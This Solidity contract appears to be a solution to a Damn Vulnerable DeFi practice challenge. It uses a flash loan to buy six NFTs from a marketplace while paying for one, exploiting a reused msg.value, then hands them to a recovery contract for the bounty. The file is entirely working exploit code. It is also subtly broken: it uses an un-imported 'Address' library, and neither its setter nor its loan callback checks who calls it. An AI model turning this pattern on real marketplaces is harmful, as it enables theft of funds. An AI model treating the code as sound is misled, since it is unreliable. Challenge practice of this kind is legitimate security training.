// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {FreeRiderNFTMarketplace} from "../src/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "../src/FreeRiderRecoveryManager.sol";
import {DamnValuableNFT} from "../src/DamnValuableNFT.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

contract Resolver is IERC721Receiver, IERC3156FlashBorrower {
    using Address for address payable;
    FreeRiderNFTMarketplace public marketpalace;
    FreeRiderRecoveryManager public recoveryManager;
    DamnValuableNFT public nft;

    constructor(FreeRiderNFTMarketplace _marketPlace) {
        marketpalace = _marketPlace;
        nft = marketpalace.token();
    }

    function setRecoveryManager(
        FreeRiderRecoveryManager _recoveryManager
    ) external {
        require(address(recoveryManager) == address(0), "already-set");
        recoveryManager = _recoveryManager;
    }

    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256,
        bytes calldata
    ) external override returns (bytes32) {
        uint256[] memory tokenIds = new uint256[](6);

        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }

        marketpalace.buyMany{value: amount}(tokenIds);
        for (uint256 i = 0; i < 6; i++) {
            bytes memory data = i == 5
                ? abi.encode(address(this))
                : new bytes(0);
            nft.safeTransferFrom(
                address(this),
                address(recoveryManager),
                i,
                data
            );
        }

        // Repay flash loan

        SafeTransferLib.safeTransferETH(msg.sender, amount); // optimized one , Recommended

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    receive() external payable {}

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external override returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
